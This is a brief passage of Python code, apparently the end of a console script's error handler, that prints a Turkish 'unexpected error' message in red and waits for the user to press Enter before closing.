        print(c_red(f"\nBeklenmeyen bir hata olustu: {e}"))
        try:
            input("\nKapatmak icin Enter'a basin...")
        except Exception:
            pass
